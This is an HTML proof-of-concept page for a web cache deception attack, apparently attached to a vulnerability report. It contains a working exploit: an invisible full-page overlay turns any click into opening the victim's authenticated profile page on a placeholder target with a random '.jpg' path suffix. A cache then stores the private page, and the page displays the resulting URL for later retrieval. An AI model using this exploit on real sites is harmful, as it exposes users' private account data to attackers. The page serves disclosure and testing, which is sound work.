<!doctype html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>Web cache deception PoC</title>
        <script>
            function makeid(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                const charactersLength = characters.length;
                let counter = 0;
                while (counter < length) {
                  result += characters.charAt(Math.floor(Math.random() * charactersLength));
                  counter += 1;
                }
                return result;
            }
            function pocLink() {
                let link = "https://target_site.com/example/view_profile;"+makeid(12)+".jpg";
                let a = window.open(link);
                setTimeout(() => {
                    a.close();
                    document.write("You can access to cached page at "+link+" (follow the instructions from the report)");
                }, "1000");

            }
        </script>
    </head>
    <body>
        Click anywhere on the page
        <div style="display:block; position:absolute;top: 0;right: 0; bottom: 0; left: 0; z-index: 10; overflow-y: scroll;" id="x" onclick="pocLink();"></div>                 
    </body>
</html>
